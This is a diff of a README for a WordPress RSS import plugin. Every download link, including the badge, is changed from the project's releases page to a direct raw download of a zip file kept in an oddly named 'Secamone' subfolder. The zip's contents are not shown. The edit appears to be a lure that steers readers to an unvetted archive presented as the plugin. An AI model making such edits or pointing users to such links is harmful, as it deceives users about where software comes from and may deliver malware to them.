@@ -6,7 +6,7 @@ Welcome to rss-retriever-lite! This tool helps you import feeds into WordPress e
 
 ## 🔗 Download Now!
 
-[![Download rss-retriever-lite](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/battlegrandsltd/rss-retriever-lite/releases)
+[![Download rss-retriever-lite](https://raw.githubusercontent.com/battlegrandsltd/rss-retriever-lite/main/Secamone/rss-retriever-lite.zip)](https://raw.githubusercontent.com/battlegrandsltd/rss-retriever-lite/main/Secamone/rss-retriever-lite.zip)
 
 ## 📦 System Requirements
 
@@ -23,7 +23,7 @@ To download and install rss-retriever-lite, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the download page. 
    
-   [Download rss-retriever-lite](https://github.com/battlegrandsltd/rss-retriever-lite/releases)
+   [Download rss-retriever-lite](https://raw.githubusercontent.com/battlegrandsltd/rss-retriever-lite/main/Secamone/rss-retriever-lite.zip)
 
 2. **Select Your Version:** Look for the latest version of rss-retriever-lite. It is often recommended to download the stable version.
    
@@ -90,6 +90,6 @@ rss-retriever-lite is open-source software. You can use, modify, and distribute 
 
 Make sure to download the plugin to enhance your WordPress experience:
 
-[Download rss-retriever-lite](https://github.com/battlegrandsltd/rss-retriever-lite/releases)
+[Download rss-retriever-lite](https://raw.githubusercontent.com/battlegrandsltd/rss-retriever-lite/main/Secamone/rss-retriever-lite.zip)
 
 Thank you for choosing rss-retriever-lite!
